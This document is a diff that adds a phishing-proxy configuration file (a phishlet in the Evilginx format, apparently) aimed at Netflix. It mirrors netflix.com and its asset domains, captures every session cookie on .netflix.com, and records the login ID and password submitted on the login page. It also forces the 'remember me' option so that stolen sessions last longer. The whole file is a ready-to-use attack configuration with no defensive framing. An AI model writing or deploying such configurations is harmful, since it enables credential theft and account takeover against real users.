@@ -1,0 +1,38 @@
+author: '@charlesbel'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'netflix.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'codex', orig_sub: 'codex', domain: 'nflxext.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'nflxext.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'www.netflix.com', orig_sub: 'www', domain: 'netflix.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.netflix.com', orig_sub: 'codex', domain: 'nflxext.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.netflix.com', orig_sub: 'assets', domain: 'nflxext.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.netflix.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/browse'
+  - '/signup'
+    
+credentials:
+  username:
+    key: 'userLoginId'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.netflix.com'
+  path: '/login'
+
+force_post:
+  - path: '/(.*)/login'
+    force:
+      - {key: 'rememberMe', value: 'true'}
+    type: 'post'
